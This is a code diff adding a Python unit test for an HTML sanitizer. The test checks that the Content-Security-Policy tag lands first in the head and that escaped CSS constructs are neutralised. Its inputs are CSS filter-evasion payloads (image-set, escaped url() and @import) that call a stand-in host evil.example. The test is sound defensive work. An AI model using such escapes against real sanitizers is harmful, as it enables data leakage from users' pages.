@@ -38,6 +38,17 @@ def test_sanitizer_removes_scripts_external_resources_and_handlers():
     assert "게시글 제목 &amp; 작성자" in out and "border:1px solid #ddd" in out
 
 
+def test_sanitizer_csp_is_first_in_head_and_css_escapes_are_inert():
+    """<header>를 <head>로 착각하거나 style이 앞에 오면 CSP가 head 밖으로 밀려 무시됐다."""
+    for raw in ('<header>x</header><div>y</div>', '<style>.a{color:red}</style><head><title>t</title></head>'):
+        out = sanitize_html(raw)
+        assert out.startswith('<!DOCTYPE html>\n<html lang="ko"><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy"')
+        assert out.count("<head>") == 1 and out.count("Content-Security-Policy") == 1
+    out = sanitize_html('<style>.a{background:image-set("https://evil.example/?d=1")} .b{background:u\\72l(https://evil.example)}'
+                        ' @\\69mport "https://evil.example/x.css";</style>')
+    assert "evil.example/?d" not in out and "url(" not in out.lower() and "@import" not in out.lower()
+
+
 def test_extract_html_and_filename():
     html, rest = extract_html("**커뮤니티 목록**\n\n```html\n<div>x</div>\n```\n\n근거:\n- a/b.tsx:1 — 탭")
     assert html == "<div>x</div>" and "```" not in rest and rest.startswith("**커뮤니티 목록**") and "근거:" in rest
